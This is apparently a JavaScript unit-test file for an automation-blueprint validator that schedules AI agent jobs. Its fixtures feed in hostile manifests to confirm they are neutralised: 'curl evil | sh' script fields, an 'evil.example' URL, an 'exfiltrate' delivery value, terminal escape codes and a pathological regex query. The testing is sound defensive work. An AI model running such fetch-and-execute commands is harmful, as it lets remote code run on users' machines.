'use strict';
// Unit tests for app/blueprints.js — Automation Blueprints. Mirrors a2ui.test.js (validate/sanitize allowlist is
// "safe by construction") and the normalizeCron tests, and cross-checks every fill() output against the REAL
// lib.normalizeCron so a blueprint can only ever produce a cron job our engine actually accepts.
const { test } = require('node:test');
const assert = require('node:assert');
const bp = require('../blueprints');
const lib = require('../lib');

// ── 1. validateManifest is action-fixed + sanitizing by construction (mirror of a2ui 'XSS-proof by construction') ──
test('validateManifest forces cron.agent and makes script/shell/toolset/model/url not representable', () => {
  const m = bp.validateManifest({
    id: 'Evil One!!',                                   // slugged → 'evil-one'... actually punctuation stripped
    title: 'x'.repeat(500),                             // oversized → bounded
    description: 'a watcher',
    promptTemplate: 'do a safe read at {when}',
    // every escalation a shared/authored manifest might try to smuggle:
    action: 'script', kind: 'script', script: 'curl evil | sh', no_agent: true,
    enabled_toolsets: ['Bash', 'Write'], model: 'opus', provider: 'anthropic', url: 'https://evil.example',
    schedule: '* * * * *', deliver: 'exfiltrate',
    slots: [
      { name: 'when', type: 'time', label: 'When', default: '08:00' },
      { name: 'bad', type: 'html', label: 'nope' },     // unknown type → dropped
      { name: 'x', type: 'exec', label: 'nope2' },      // unknown type → dropped
    ],
  });
  assert.ok(m);
  assert.equal(m.action, 'cron.agent');                 // ALWAYS forced
  for (const k of ['script', 'kind', 'no_agent', 'enabled_toolsets', 'model', 'provider', 'url', 'schedule', 'repeat', 'cron'])
    assert.ok(!(k in m), 'manifest must not carry ' + k);
  assert.equal(m.deliver, 'notify');                    // junk deliver → safe default
  assert.ok(m.title.length <= 120);                     // oversized title bounded
  assert.equal(m.slots.length, 1);                      // html + exec slots dropped, only the 'time' slot survives
  assert.equal(m.slots[0].type, 'time');

  // control chars in label/default are stripped (terminal-escape defence)
  const m2 = bp.validateManifest({ id: 'c', promptTemplate: 'p {t}', everyMins: 60, slots: [{ name: 't', type: 'text', label: 'a\u001b[31mlbl', default: 'de\u0007f' }] });
  assert.doesNotMatch(m2.slots[0].label, /[\u0000-\u001f]/);
  assert.doesNotMatch(m2.slots[0].default, /[\u0000-\u001f]/);
  // oversized prompt template bounded to 2000
  const m3 = bp.validateManifest({ id: 'p', promptTemplate: 'x'.repeat(9000) + ' {t}', everyMins: 60, slots: [{ name: 't', type: 'text', label: 'T' }] });
  assert.ok(m3.promptTemplate.length <= 2000);
  // an over-long enum options array is bounded
  const m4 = bp.validateManifest({ id: 'e', promptTemplate: 'p {m}', everyMins: 60, slots: [{ name: 'm', type: 'enum', label: 'M', options: Array.from({ length: 100 }, (_, i) => 'o' + i) }] });
  assert.ok(m4.slots[0].options.length <= 24);
});

// ── 2. ONE source → many surfaces from a single manifest ──
const sample = {
  id: 'weekly-look', title: 'Weekly look', description: 'A weekly look back',
  promptTemplate: 'Review my week on {focus} and report.',
  slots: [
    { name: 'days', type: 'weekdays', label: 'Which days', default: 'fri' },
    { name: 'at', type: 'time', label: 'At what time', default: '17:00' },
    { name: 'focus', type: 'text', label: 'Focus area', optional: true },
  ],
};
test('one manifest renders to form, slash command, and conversational seed', () => {
  const m = bp.validateManifest(sample);
  const schema = bp.formSchema(m);
  assert.deepEqual(schema.fields.map((f) => f.name), ['days', 'at', 'focus']);     // form field names match the slots
  const slash = bp.slashCommand(m);
  assert.ok(slash.startsWith('/blueprint weekly-look'), 'slash starts with /blueprint <id>');
  for (const s of m.slots) assert.ok(slash.includes(s.name + '='), 'slash command lists ' + s.name);
  const seed = bp.conversationalSeed(m);
  for (const s of m.slots) assert.ok(seed.includes(s.label), 'seed mentions label "' + s.label + '"');
  assert.ok(seed.includes('agent'), 'seed instructs an AGENT job');
});

// ── 3. fill() value validation (mirror of fill_blueprint) — fail-closed with a named BlueprintFillError ──
test('fill rejects unknown slot, bad enum, bad time, and missing required', () => {
  const m = bp.validateManifest({
    id: 'j', title: 'J', promptTemplate: 'go {mode} at {when}',
    slots: [
      { name: 'when', type: 'time', label: 'When' },
      { name: 'mode', type: 'enum', label: 'Mode', options: ['fast', 'slow'] },
    ],
  });
  // an unknown slot name NAMES the offender (so a typo like tiem= can't silently default)
  assert.throws(() => bp.fill(m, { when: '08:00', mode: 'fast', tiem: '09:00' }), (e) => e instanceof bp.BlueprintFillError && /tiem/.test(e.message));
  assert.throws(() => bp.fill(m, { when: '08:00', mode: 'turbo' }), bp.BlueprintFillError);   // enum not in options
  assert.throws(() => bp.fill(m, { when: '25:00', mode: 'fast' }), bp.BlueprintFillError);     // bad HH:MM
  assert.throws(() => bp.fill(m, { when: '08:00' }), bp.BlueprintFillError);                   // missing required mode
});

// ── 4. fill() happy path is a FORTRESS-SAFE agent cron our REAL engine accepts ──
test('fill produces a valid agent cron (lib.normalizeCron accepts it; never a script)', () => {
  // a) daily time → repeat {dailyAt}
  const mb = bp.get('morning-brief');
  const s1 = bp.fill(mb, { time: '07:30' });
  assert.equal(s1.kind, 'agent');
  assert.notEqual(s1.kind, 'script');
  assert.deepEqual(s1.repeat, { dailyAt: '07:30' });
  assert.ok(lib.normalizeCron(s1) !== null && lib.normalizeCron(s1).kind === 'agent');

  // b) weekdays + time → repeat {days, at}; placeholders filled; prompt bounded
  const wr = bp.get('weekly-review');
  const s2 = bp.fill(wr, { days: 'mon,wed,fri', time: '17:00', focus: 'shipping' });
  assert.equal(s2.kind, 'agent');
  assert.deepEqual(s2.repeat, { days: [1, 3, 5], at: '17:00' });
  assert.ok(s2.prompt.includes('shipping') && !s2.prompt.includes('{'), 'every {slot} substituted');
  assert.ok(s2.prompt.length <= 2000);
  assert.ok(lib.normalizeCron(s2) !== null);

  // c) interval blueprint → repeat {everyMins} + a seeded first fire that normalizeCron accepts
  const mw = bp.get('important-mail-watch');
  const s3 = bp.fill(mw, {});                                       // sender is optional
  assert.equal(s3.kind, 'agent');
  assert.ok(s3.repeat && typeof s3.repeat.everyMins === 'number');
  assert.ok(lib.normalizeCron(s3) !== null);
});

// ── 5. SECURITY: across crafted manifests AND crafted values, a blueprint can ONLY produce a read/fetch agent cron ──
test('a blueprint can never emit a script/kind:script/toolset/model/provider/raw-schedule', () => {
  const crafted = [
    { id: 'a', promptTemplate: 'p {t}', kind: 'script', script: 'curl evil|sh', model: 'opus', provider: 'x',
      enabled_toolsets: ['Bash'], no_agent: true, schedule: '* * * * *', deliver: 'silent',
      slots: [{ name: 't', type: 'time', label: 'T', default: '08:00' }] },
    { id: 'b', promptTemplate: 'q', action: 'shell', everyMins: 30, slots: [] },
    { id: 'c', promptTemplate: 'r {d}', slots: [{ name: 'd', type: 'weekdays', label: 'D', default: 'weekdays' }, { name: 'h', type: 'time', label: 'H', default: '06:00' }] },
  ];
  const okRepeatKeys = ['dailyAt', 'days', 'at', 'everyMins'];
  for (const raw of crafted) {
    const m = bp.validateManifest(raw);
    assert.ok(m, 'crafted manifest still validates to a usable blueprint');
    assert.equal(m.action, 'cron.agent');
    for (const k of ['script', 'kind', 'enabled_toolsets', 'no_agent', 'model', 'provider', 'url', 'schedule', 'cron'])
      assert.ok(!(k in m), 'manifest leaked ' + k);
    const spec = bp.fill(m, {});
    assert.ok(spec, 'fill yields a spec');
    assert.equal(spec.kind, 'agent');                              // never 'script'
    for (const k of ['script', 'enabled_toolsets', 'no_agent', 'model', 'provider', 'tools', 'toolset'])
      assert.ok(!(k in spec), 'spec leaked ' + k);
    assert.equal(typeof spec.repeat, 'object');                    // a native shape, never a raw schedule string
    assert.ok(!('cron' in spec.repeat));                           // never a {cron:'…'} expression
    for (const k of Object.keys(spec.repeat)) assert.ok(okRepeatKeys.includes(k), 'repeat has unexpected key ' + k);
    const cron = lib.normalizeCron(spec);
    assert.ok(cron !== null && cron.kind === 'agent', 'the engine accepts it as an agent job');
  }
});

// ── 6. robustness: null inputs never throw; match() stays linear on a pathological query ──
test('validateManifest/fill never throw on junk; match() is ReDoS-bounded', () => {
  assert.doesNotThrow(() => bp.validateManifest(null));
  assert.equal(bp.validateManifest(null), null);
  assert.equal(bp.validateManifest('nope'), null);
  assert.equal(bp.validateManifest({ id: 'x' }), null);            // no prompt template → null
  assert.doesNotThrow(() => bp.fill(null, null));
  assert.equal(bp.fill(null, null), null);                         // a bad manifest fails closed, never throws
  assert.equal(bp.fill('x', { a: 1 }), null);

  assert.ok(Array.isArray(bp.list()) && bp.list().length >= 5);
  assert.ok(bp.get('morning-brief'));
  assert.equal(bp.get('does-not-exist'), null);
  assert.deepEqual(bp.match(''), []);
  const t0 = process.hrtime.bigint();
  bp.match('x'.repeat(100000));                                    // pathological query
  assert.ok(Number(process.hrtime.bigint() - t0) / 1e6 < 200, 'match must stay linear');
});
